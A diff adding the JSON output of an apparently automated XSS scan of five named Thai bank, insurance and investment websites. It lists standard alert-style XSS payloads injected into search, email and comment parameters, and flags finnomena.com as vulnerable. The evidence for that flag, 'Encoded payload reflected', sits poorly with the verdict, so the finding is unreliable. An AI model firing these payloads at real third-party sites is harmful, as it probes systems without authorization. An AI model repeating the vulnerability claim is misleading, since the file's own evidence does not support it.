@@ -1,0 +1,135 @@
+{
+  "scan_date": "2025-10-27 16:16:12",
+  "total_tested": 5,
+  "accessible": 5,
+  "vulnerable": 1,
+  "results": [
+    {
+      "url": "https://www.bangkokbank.com",
+      "accessible": true,
+      "vulnerable": false,
+      "xss_points": []
+    },
+    {
+      "url": "https://www.kasikornbank.com",
+      "accessible": true,
+      "vulnerable": false,
+      "xss_points": []
+    },
+    {
+      "url": "https://www.finnomena.com",
+      "accessible": true,
+      "vulnerable": true,
+      "xss_points": [
+        {
+          "parameter": "q",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "q",
+          "payload": "<svg onload=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "search",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "search",
+          "payload": "<svg onload=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "keyword",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "keyword",
+          "payload": "<svg onload=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "query",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "query",
+          "payload": "<svg onload=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "name",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "name",
+          "payload": "<svg onload=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "email",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "email",
+          "payload": "<svg onload=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "message",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "message",
+          "payload": "<svg onload=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "comment",
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        },
+        {
+          "parameter": "comment",
+          "payload": "<svg onload=alert('XSS')>",
+          "type": "Encoded XSS",
+          "evidence": "Encoded payload reflected"
+        }
+      ]
+    },
+    {
+      "url": "https://www.muangthai.co.th",
+      "accessible": true,
+      "vulnerable": false,
+      "xss_points": []
+    },
+    {
+      "url": "https://www.aia.co.th",
+      "accessible": true,
+      "vulnerable": false,
+      "xss_points": []
+    }
+  ]
+}
